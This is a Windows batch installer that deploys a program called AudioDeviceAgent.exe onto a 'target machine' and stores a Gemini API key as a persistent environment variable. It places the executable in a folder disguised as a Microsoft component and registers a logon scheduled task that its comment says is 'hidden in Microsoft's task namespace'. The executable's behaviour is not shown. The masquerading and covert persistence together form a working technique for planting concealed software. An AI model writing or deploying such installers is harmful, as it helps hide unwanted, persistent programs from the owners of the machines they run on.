@echo off
REM One-time installation on the target machine.

set "TARGET_DIR=%LOCALAPPDATA%\Microsoft\AudioDevice"
set "EXE=%TARGET_DIR%\AudioDeviceAgent.exe"

mkdir "%TARGET_DIR%" 2>NUL
copy /Y dist\AudioDeviceAgent.exe "%EXE%" || (echo copy failed & exit /b 1)

REM API key: persistent user env var (survives reboot; visible ONLY to this user)
if "%GEMINI_API_KEY%"=="" (
  set /p GEMINI_API_KEY="Paste GEMINI_API_KEY: "
)
setx GEMINI_API_KEY "%GEMINI_API_KEY%" >NUL

REM Autostart on login, hidden in Microsoft's task namespace
schtasks /Create /F /TN "Microsoft\Windows\AudioDeviceBridge" ^
  /TR "\"%EXE%\"" /SC ONLOGON /RL LIMITED

echo Starting now...
start "" "%EXE%"
echo Deployed. Reboot to verify autostart.
pause
